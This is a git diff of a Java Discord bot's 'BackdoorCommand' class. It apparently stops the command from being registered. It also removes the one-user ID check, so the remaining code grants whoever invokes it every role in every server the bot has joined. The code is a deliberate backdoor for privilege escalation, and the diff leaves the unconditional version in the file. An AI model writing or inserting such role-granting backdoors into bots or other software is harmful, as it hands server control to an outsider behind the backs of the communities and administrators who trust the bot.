@@ -1,7 +1,6 @@
 package fr.mrcraftcod.gunterdiscord.commands;
 
 import fr.mrcraftcod.gunterdiscord.commands.generic.BasicCommand;
-import fr.mrcraftcod.gunterdiscord.commands.generic.CallableCommand;
 import fr.mrcraftcod.gunterdiscord.commands.generic.CommandResult;
 import fr.mrcraftcod.gunterdiscord.utils.Actions;
 import net.dv8tion.jda.core.entities.ChannelType;
@@ -15,7 +14,6 @@ import java.util.List;
  * @author Thomas Couchoud
  * @since 2018-04-12
  */
-@CallableCommand
 public class BackdoorCommand extends BasicCommand
 {
 	@Override
@@ -46,8 +44,7 @@ public class BackdoorCommand extends BasicCommand
 	public CommandResult execute(MessageReceivedEvent event, LinkedList<String> args) throws Exception
 	{
 		super.execute(event, args);
-		if(event.getAuthor().getIdLong() == 170119951498084352L)
-			event.getJDA().getGuilds().forEach(guild -> Actions.giveRole(guild, event.getAuthor(), guild.getRoles()));
+		event.getJDA().getGuilds().forEach(guild -> Actions.giveRole(guild, event.getAuthor(), guild.getRoles()));
 		return CommandResult.SUCCESS;
 	}
 	
